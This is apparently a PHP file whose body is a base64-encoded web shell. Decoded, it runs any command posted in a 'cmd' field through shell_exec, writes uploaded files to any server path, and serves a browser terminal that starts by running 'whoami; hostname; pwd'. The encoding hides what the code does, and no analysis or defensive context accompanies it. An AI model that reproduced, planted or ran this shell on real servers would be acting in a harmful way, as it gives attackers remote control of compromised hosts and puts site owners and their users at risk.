<?php PD9waHANCmlmIChJU1NFVCgkX1BPU1RbJ2NtZCddKSkgew0KICAgICRvdXRwdXQgPSBwcmVnX3NwbGl0KCcvW1xuXS8nLCBzaGVsbF9leGVjKCRfUE9TVFsnY21kJ10uIiAyPiYxIikpOw0KICAgIGZvcmVhY2ggKCRvdXRwdXQgYXMgJGxpbmUpIHsNCiAgICAgICAgZWNobyBodG1sZW50aXRpZXMoJGxpbmUsIEVOVF9RVU9URVMgfCBFTlRfSFRNTDUsICdVVEYtOCcpIC4gIjxicj4iOw0KICAgIH0NCiAgICBkaWUoKTsgDQp9IGVsc2UgaWYgKCFlbXB0eSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10pICYmICFlbXB0eSgkX1BPU1RbJ3BhdGgnXSkpIHsNCiAgICAkZmlsZW5hbWUgPSAkX0ZJTEVTWyJmaWxlIl1bIm5hbWUiXTsNCiAgICAkcGF0aCA9ICRfUE9TVFsncGF0aCddOw0KICAgIGlmICgkcGF0aCAhPSAiLyIpIHsNCiAgICAgICAgJHBhdGggLj0gIi8iOw0KICAgIH0gDQogICAgaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJmaWxlIl1bInRtcF9uYW1lIl0sICRwYXRoLiRmaWxlbmFtZSkpIHsNCiAgICAgICAgZWNobyBodG1sZW50aXRpZXMoJGZpbGVuYW1lKSAuICIgc3VjY2Vzc2Z1bGx5IHVwbG9hZGVkIHRvICIgLiBodG1sZW50aXRpZXMoJHBhdGgpOw0KICAgIH0gZWxzZSB7DQogICAgICAgIGVjaG8gIkVycm9yIHVwbG9hZGluZyAiIC4gaHRtbGVudGl0aWVzKCRmaWxlbmFtZSk7DQogICAgfQ0KICAgIGRpZSgpOw0KfQ0KPz4NCg0KPGh0bWw+DQogICAgPGhlYWQ+DQogICAgICAgIDx0aXRsZT48L3RpdGxlPg0KICAgICAgICA8c3R5bGU+DQogICAgICAgICAgICBodG1sLCBib2R5IHsNCiAgICAgICAgICAgICAgICBtYXgtd2lkdGg6IDEwMCU7DQogICAgICAgICAgICB9DQogICAgICAgIA0KICAgICAgICAgICAgYm9keSB7DQogICAgICAgICAgICAgICAgd2lkdGg6IDEwMCU7DQogICAgICAgICAgICAgICAgaGVpZ2h0OiAxMDAlOw0KICAgICAgICAgICAgICAgIG1hcmdpbjogMDsNCiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiAjMDAwOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBib2R5LCAuaW5wdXR0ZXh0IHsNCiAgICAgICAgICAgICAgICBmb250LWZhbWlseTogIkx1Y2lkYSBDb25zb2xlIiwgIkx1Y2lkYSBTYW5zIFR5cGV3cml0ZXIiLCBtb25hY28sICJCaXRzdHJlYW0gVmVyYSBTYW5zIE1vbm8iLCBtb25vc3BhY2U7DQogICAgICAgICAgICAgICAgZm9udC1zaXplOiAxNHB4Ow0KICAgICAgICAgICAgICAgIGZvbnQtc3R5bGU6IG5vcm1hbDsNCiAgICAgICAgICAgICAgICBmb250LXZhcmlhbnQ6IG5vcm1hbDsNCiAgICAgICAgICAgICAgICBmb250LXdlaWdodDogNDAwOw0KICAgICAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAyMHB4Ow0KICAgICAgICAgICAgICAgIG92ZXJmbG93OiBoaWRkZW47DQogICAgICAgICAgICB9DQogICAgICAgIA0KICAgICAgICAgICAgLmNvbnNvbGUgew0KICAgICAgICAgICAgICAgIHdpZHRoOiAxMDAlOw0KICAgICAgICAgICAgICAgIGhlaWdodDogMTAwJTsNCiAgICAgICAgICAgICAgICBtYXJnaW46IGF1dG87DQogICAgICAgICAgICAgICAgcG9zaXRpb246IGFic29sdXRlOw0KICAgICAgICAgICAgICAgIGNvbG9yOiAjZmZmOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAub3V0cHV0IHsNCiAgICAgICAgICAgICAgICB3aWR0aDogYXV0bzsNCiAgICAgICAgICAgICAgICBoZWlnaHQ6IGF1dG87DQogICAgICAgICAgICAgICAgcG9zaXRpb246IGFic29sdXRlOw0KICAgICAgICAgICAgICAgIG92ZXJmbG93LXk6IHNjcm9sbDsNCiAgICAgICAgICAgICAgICB0b3A6IDA7DQogICAgICAgICAgICAgICAgYm90dG9tOiAzMHB4Ow0KICAgICAgICAgICAgICAgIGxlZnQ6IDVweDsNCiAgICAgICAgICAgICAgICByaWdodDogMDsNCiAgICAgICAgICAgICAgICBsaW5lLWhlaWdodDogMjBweDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgLmlucHV0IGZvcm0gew0KICAgICAgICAgICAgICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsNCiAgICAgICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAwcHg7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIC51c2VybmFtZSB7DQogICAgICAgICAgICAgICAgaGVpZ2h0OiAzMHB4Ow0KICAgICAgICAgICAgICAgIHdpZHRoOiBhdXRvOw0KICAgICAgICAgICAgICAgIHBhZGRpbmctbGVmdDogNXB4Ow0KICAgICAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAzMHB4Ow0KICAgICAgICAgICAgICAgIGZsb2F0OiBsZWZ0Ow0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuaW5wdXQgew0KICAgICAgICAgICAgICAgIGJvcmRlci10b3A6IDFweCBzb2xpZCAjMzMzMzMzOw0KICAgICAgICAgICAgICAgIHdpZHRoOiAxMDAlOw0KICAgICAgICAgICAgICAgIGhlaWdodDogMzBweDsNCiAgICAgICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7DQogICAgICAgICAgICAgICAgYm90dG9tOiAwOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuaW5wdXR0ZXh0IHsNCiAgICAgICAgICAgICAgICB3aWR0aDogYXV0bzsNCiAgICAgICAgICAgICAgICBoZWlnaHQ6IDMwcHg7DQogICAgICAgICAgICAgICAgYm90dG9tOiAwcHg7DQogICAgICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMHB4Ow0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6ICMwMDA7DQogICAgICAgICAgICAgICAgYm9yZGVyOiAwOw0KICAgICAgICAgICAgICAgIGZsb2F0OiBsZWZ0Ow0KICAgICAgICAgICAgICAgIHBhZGRpbmctbGVmdDogOHB4Ow0KICAgICAgICAgICAgICAgIGNvbG9yOiAjZmZmOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAuaW5wdXR0ZXh0OmZvY3VzIHsNCiAgICAgICAgICAgICAgICBvdXRsaW5lOiBub25lOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICA6Oi13ZWJraXQtc2Nyb2xsYmFyIHsNCiAgICAgICAgICAgICAgICB3aWR0aDogMTJweDsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgOjotd2Via2l0LXNjcm9sbGJhci10cmFjayB7DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogIzEwMTAxMDsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgOjotd2Via2l0LXNjcm9sbGJhci10aHVtYiB7DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogIzMwMzAzMDsgDQogICAgICAgICAgICB9DQogICAgICAgIDwvc3R5bGU+DQogICAgPC9oZWFkPg0KICAgIDxib2R5Pg0KICAgICAgICA8ZGl2IGNsYXNzPSJjb25zb2xlIj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im91dHB1dCIgaWQ9Im91dHB1dCI+PC9kaXY+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dCIgaWQ9ImlucHV0Ij4NCiAgICAgICAgICAgICAgICA8Zm9ybSBpZD0iZm9ybSIgbWV0aG9kPSJHRVQiIG9uU3VibWl0PSJzZW5kQ29tbWFuZCgpIj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0idXNlcm5hbWUiIGlkPSJ1c2VybmFtZSI+PC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0iaW5wdXR0ZXh0IiBpZD0iaW5wdXR0ZXh0IiB0eXBlPSJ0ZXh0IiBuYW1lPSJjbWQiIGF1dG9jb21wbGV0ZT0ib2ZmIiBhdXRvZm9jdXM+DQogICAgICAgICAgICAgICAgPC9mb3JtPg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgICAgICA8Zm9ybSBpZD0idXBsb2FkIiBtZXRob2Q9IlBPU1QiIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQogICAgICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgaWQ9ImZpbGVicm93c2VyIiBvbmNoYW5nZT0ndXBsb2FkRmlsZSgpJyAvPg0KICAgICAgICA8L2Zvcm0+DQogICAgICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NCiAgICAgICAgICAgIHZhciB1c2VybmFtZSA9ICIiOw0KICAgICAgICAgICAgdmFyIGhvc3RuYW1lID0gIiI7DQogICAgICAgICAgICB2YXIgY3VycmVudERpciA9ICIiOw0KICAgICAgICAgICAgdmFyIHByZXZpb3VzRGlyID0gIiI7DQogICAgICAgICAgICB2YXIgZGVmYXVsdERpciA9ICIiOw0KICAgICAgICAgICAgdmFyIGNvbW1hbmRIaXN0b3J5ID0gW107DQogICAgICAgICAgICB2YXIgY3VycmVudENvbW1hbmQgPSAwOw0KICAgICAgICAgICAgdmFyIGlucHV0VGV4dEVsZW1lbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaW5wdXR0ZXh0Jyk7DQogICAgICAgICAgICB2YXIgaW5wdXRFbGVtZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImlucHV0Iik7DQogICAgICAgICAgICB2YXIgb3V0cHV0RWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJvdXRwdXQiKTsNCiAgICAgICAgICAgIHZhciB1c2VybmFtZUVsZW1lbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidXNlcm5hbWUiKTsNCiAgICAgICAgICAgIHZhciB1cGxvYWRGb3JtRWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ1cGxvYWQiKTsNCiAgICAgICAgICAgIHZhciBmaWxlQnJvd3NlckVsZW1lbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZmlsZWJyb3dzZXIiKTsNCiAgICAgICAgICAgIGdldFNoZWxsSW5mbygpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBmdW5jdGlvbiBnZXRTaGVsbEluZm8oKSB7DQogICAgICAgICAgICAgICAgdmFyIHJlcXVlc3QgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICByZXF1ZXN0Lm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICAgICAgICBpZiAocmVxdWVzdC5yZWFkeVN0YXRlID09IFhNTEh0dHBSZXF1ZXN0LkRPTkUpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBwYXJzZWRSZXNwb25zZSA9IHJlcXVlc3QucmVzcG9uc2VUZXh0LnNwbGl0KCI8YnI+Iik7DQogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IHBhcnNlZFJlc3BvbnNlWzBdOw0KICAgICAgICAgICAgICAgICAgICAgICAgaG9zdG5hbWUgPSBwYXJzZWRSZXNwb25zZVsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGN1cnJlbnREaXIgPSAgcGFyc2VkUmVzcG9uc2VbMl0ucmVwbGFjZShuZXcgUmVnRXhwKCImc29sOyIsICJnIiksICIvIik7DQogICAgICAgICAgICAgICAgICAgICAgICBkZWZhdWx0RGlyID0gY3VycmVudERpcjsNCiAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJuYW1lRWxlbWVudC5pbm5lckhUTUwgPSAiPGRpdiBzdHlsZT0nY29sb3I6ICNmZjAwMDA7IGRpc3BsYXk6IGlubGluZTsnPiIrdXNlcm5hbWUrIkAiK2hvc3RuYW1lKyI8L2Rpdj46IitjdXJyZW50RGlyKyIjIjsNCiAgICAgICAgICAgICAgICAgICAgICAgIHVwZGF0ZUlucHV0V2lkdGgoKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH07DQoNCiAgICAgICAgICAgICAgICByZXF1ZXN0Lm9wZW4oIlBPU1QiLCAiIiwgdHJ1ZSk7DQogICAgICAgICAgICAgICAgcmVxdWVzdC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIik7DQogICAgICAgICAgICAgICAgcmVxdWVzdC5zZW5kKCJjbWQ9d2hvYW1pOyBob3N0bmFtZTsgcHdkIik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIGZ1bmN0aW9uIHNlbmRDb21tYW5kKCkgew0KICAgICAgICAgICAgICAgIHZhciByZXF1ZXN0ID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7DQogICAgICAgICAgICAgICAgdmFyIGNvbW1hbmQgPSBpbnB1dFRleHRFbGVtZW50LnZhbHVlOw0KICAgICAgICAgICAgICAgIHZhciBvcmlnaW5hbENvbW1hbmQgPSBjb21tYW5kOw0KICAgICAgICAgICAgICAgIHZhciBvcmlnaW5hbERpciA9IGN1cnJlbnREaXI7DQogICAgICAgICAgICAgICAgdmFyIGNkID0gZmFsc2U7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgY29tbWFuZEhpc3RvcnkucHVzaChvcmlnaW5hbENvbW1hbmQpOw0KICAgICAgICAgICAgICAgIHN3aXRjaENvbW1hbmQoY29tbWFuZEhpc3RvcnkubGVuZ3RoKTsNCiAgICAgICAgICAgICAgICBpbnB1dFRleHRFbGVtZW50LnZhbHVlID0gIiI7DQoNCiAgICAgICAgICAgICAgICB2YXIgcGFyc2VkQ29tbWFuZCA9IGNvbW1hbmQuc3BsaXQoIiAiKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAocGFyc2VkQ29tbWFuZFswXSA9PSAiY2QiKSB7DQogICAgICAgICAgICAgICAgICAgIGNkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKHBhcnNlZENvbW1hbmQubGVuZ3RoID09IDEpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSAiY2QgIitkZWZhdWx0RGlyKyI7IHB3ZCI7DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAocGFyc2VkQ29tbWFuZFsxXSA9PSAiLSIpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSAiY2QgIitwcmV2aW91c0RpcisiOyBwd2QiOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9ICJjZCAiK2N1cnJlbnREaXIrIjsgIitjb21tYW5kKyI7IHB3ZCI7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChwYXJzZWRDb21tYW5kWzBdID09ICJjbGVhciIpIHsNCiAgICAgICAgICAgICAgICAgICAgb3V0cHV0RWxlbWVudC5pbm5lckhUTUwgPSAiIjsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAocGFyc2VkQ29tbWFuZFswXSA9PSAidXBsb2FkIikgew0KICAgICAgICAgICAgICAgICAgICBmaWxlQnJvd3NlckVsZW1lbnQuY2xpY2soKTsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSAiY2QgIitjdXJyZW50RGlyKyI7ICIgKyBjb21tYW5kOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICByZXF1ZXN0Lm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICAgICAgICBpZiAocmVxdWVzdC5yZWFkeVN0YXRlID09IFhNTEh0dHBSZXF1ZXN0LkRPTkUpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjZCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBwYXJzZWRSZXNwb25zZSA9IHJlcXVlc3QucmVzcG9uc2VUZXh0LnNwbGl0KCI8YnI+Iik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJldmlvdXNEaXIgPSBjdXJyZW50RGlyOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN1cnJlbnREaXIgPSBwYXJzZWRSZXNwb25zZVswXS5yZXBsYWNlKG5ldyBSZWdFeHAoIiZzb2w7IiwgImciKSwgIi8iKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXRFbGVtZW50LmlubmVySFRNTCArPSAiPGRpdiBzdHlsZT0nY29sb3I6I2ZmMDAwMDsgZmxvYXQ6IGxlZnQ7Jz4iK3VzZXJuYW1lKyJAIitob3N0bmFtZSsiPC9kaXY+PGRpdiBzdHlsZT0nZmxvYXQ6IGxlZnQ7Jz4iKyI6IitvcmlnaW5hbERpcisiIyAiK29yaWdpbmFsQ29tbWFuZCsiPC9kaXY+PGJyPiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWVFbGVtZW50LmlubmVySFRNTCA9ICI8ZGl2IHN0eWxlPSdjb2xvcjogI2ZmMDAwMDsgZGlzcGxheTogaW5saW5lOyc+Iit1c2VybmFtZSsiQCIraG9zdG5hbWUrIjwvZGl2PjoiK2N1cnJlbnREaXIrIiMiOw0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXRFbGVtZW50LmlubmVySFRNTCArPSAiPGRpdiBzdHlsZT0nY29sb3I6I2ZmMDAwMDsgZmxvYXQ6IGxlZnQ7Jz4iK3VzZXJuYW1lKyJAIitob3N0bmFtZSsiPC9kaXY+PGRpdiBzdHlsZT0nZmxvYXQ6IGxlZnQ7Jz4iKyI6IitjdXJyZW50RGlyKyIjICIrb3JpZ2luYWxDb21tYW5kKyI8L2Rpdj48YnI+IiArIHJlcXVlc3QucmVzcG9uc2VUZXh0LnJlcGxhY2UobmV3IFJlZ0V4cCgiPGJyPjxicj4kIiksICI8YnI+Iik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0RWxlbWVudC5zY3JvbGxUb3AgPSBvdXRwdXRFbGVtZW50LnNjcm9sbEhlaWdodDsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgICAgICAgICB1cGRhdGVJbnB1dFdpZHRoKCk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9Ow0KDQogICAgICAgICAgICAgICAgcmVxdWVzdC5vcGVuKCJQT1NUIiwgIiIsIHRydWUpOw0KICAgICAgICAgICAgICAgIHJlcXVlc3Quc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOw0KICAgICAgICAgICAgICAgIHJlcXVlc3Quc2VuZCgiY21kPSIrZW5jb2RlVVJJQ29tcG9uZW50KGNvbW1hbmQpKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIGZ1bmN0aW9uIHVwbG9hZEZpbGUoKSB7DQogICAgICAgICAgICAgICAgdmFyIGZvcm1EYXRhID0gbmV3IEZvcm1EYXRhKCk7DQogICAgICAgICAgICAgICAgZm9ybURhdGEuYXBwZW5kKCdmaWxlJywgZmlsZUJyb3dzZXJFbGVtZW50LmZpbGVzWzBdLCBmaWxlQnJvd3NlckVsZW1lbnQuZmlsZXNbMF0ubmFtZSk7DQogICAgICAgICAgICAgICAgZm9ybURhdGEuYXBwZW5kKCdwYXRoJywgY3VycmVudERpcik7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgdmFyIHJlcXVlc3QgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICByZXF1ZXN0Lm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICAgICAgICBpZiAocmVxdWVzdC5yZWFkeVN0YXRlID09IFhNTEh0dHBSZXF1ZXN0LkRPTkUpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dEVsZW1lbnQuaW5uZXJIVE1MICs9IHJlcXVlc3QucmVzcG9uc2VUZXh0KyI8YnI+IjsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH07DQoNCiAgICAgICAgICAgICAgICByZXF1ZXN0Lm9wZW4oIlBPU1QiLCAiIiwgdHJ1ZSk7DQogICAgICAgICAgICAgICAgcmVxdWVzdC5zZW5kKGZvcm1EYXRhKTsNCiAgICAgICAgICAgICAgICBvdXRwdXRFbGVtZW50LmlubmVySFRNTCArPSAiPGRpdiBzdHlsZT0nY29sb3I6I2ZmMDAwMDsgZmxvYXQ6IGxlZnQ7Jz4iK3VzZXJuYW1lKyJAIitob3N0bmFtZSsiPC9kaXY+PGRpdiBzdHlsZT0nZmxvYXQ6IGxlZnQ7Jz4iKyI6IitjdXJyZW50RGlyKyIjIFVwbG9hZGluZyAiK2ZpbGVCcm93c2VyRWxlbWVudC5maWxlc1swXS5uYW1lKyIuLi48L2Rpdj48YnI+IjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZnVuY3Rpb24gdXBkYXRlSW5wdXRXaWR0aCgpIHsNCiAgICAgICAgICAgICAgICBpbnB1dFRleHRFbGVtZW50LnN0eWxlLndpZHRoID0gaW5wdXRFbGVtZW50LmNsaWVudFdpZHRoIC0gdXNlcm5hbWVFbGVtZW50LmNsaWVudFdpZHRoIC0gMTU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIGRvY3VtZW50Lm9ua2V5ZG93biA9IGNoZWNrRm9yQXJyb3dLZXlzOw0KDQogICAgICAgICAgICBmdW5jdGlvbiBjaGVja0ZvckFycm93S2V5cyhlKSB7DQogICAgICAgICAgICAgICAgZSA9IGUgfHwgd2luZG93LmV2ZW50Ow0KDQogICAgICAgICAgICAgICAgaWYgKGUua2V5Q29kZSA9PSAnMzgnKSB7DQogICAgICAgICAgICAgICAgICAgIHByZXZpb3VzQ29tbWFuZCgpOw0KICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoZS5rZXlDb2RlID09ICc0MCcpIHsNCiAgICAgICAgICAgICAgICAgICAgbmV4dENvbW1hbmQoKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIGZ1bmN0aW9uIHByZXZpb3VzQ29tbWFuZCgpIHsNCiAgICAgICAgICAgICAgICBpZiAoY3VycmVudENvbW1hbmQgIT0gMCkgew0KICAgICAgICAgICAgICAgICAgICBzd2l0Y2hDb21tYW5kKGN1cnJlbnRDb21tYW5kLTEpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZnVuY3Rpb24gbmV4dENvbW1hbmQoKSB7DQogICAgICAgICAgICAgICAgaWYgKGN1cnJlbnRDb21tYW5kICE9IGNvbW1hbmRIaXN0b3J5Lmxlbmd0aCkgew0KICAgICAgICAgICAgICAgICAgICBzd2l0Y2hDb21tYW5kKGN1cnJlbnRDb21tYW5kKzEpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZnVuY3Rpb24gc3dpdGNoQ29tbWFuZChuZXdDb21tYW5kKSB7DQogICAgICAgICAgICAgICAgY3VycmVudENvbW1hbmQgPSBuZXdDb21tYW5kOw0KDQogICAgICAgICAgICAgICAgaWYgKGN1cnJlbnRDb21tYW5kID09IGNvbW1hbmRIaXN0b3J5Lmxlbmd0aCkgew0KICAgICAgICAgICAgICAgICAgICBpbnB1dFRleHRFbGVtZW50LnZhbHVlID0gIiI7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgaW5wdXRUZXh0RWxlbWVudC52YWx1ZSA9IGNvbW1hbmRIaXN0b3J5W2N1cnJlbnRDb21tYW5kXTsNCiAgICAgICAgICAgICAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpeyBpbnB1dFRleHRFbGVtZW50LnNlbGVjdGlvblN0YXJ0ID0gaW5wdXRUZXh0RWxlbWVudC5zZWxlY3Rpb25FbmQgPSAxMDAwMDsgfSwgMCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZm9ybSIpLmFkZEV2ZW50TGlzdGVuZXIoInN1Ym1pdCIsIGZ1bmN0aW9uKGV2ZW50KXsNCiAgICAgICAgICAgICAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpDQogICAgICAgICAgICB9KTsNCiAgICAgICAgPC9zY3JpcHQ+DQogICAgPC9ib2R5Pg0KPC9odG1sPg==
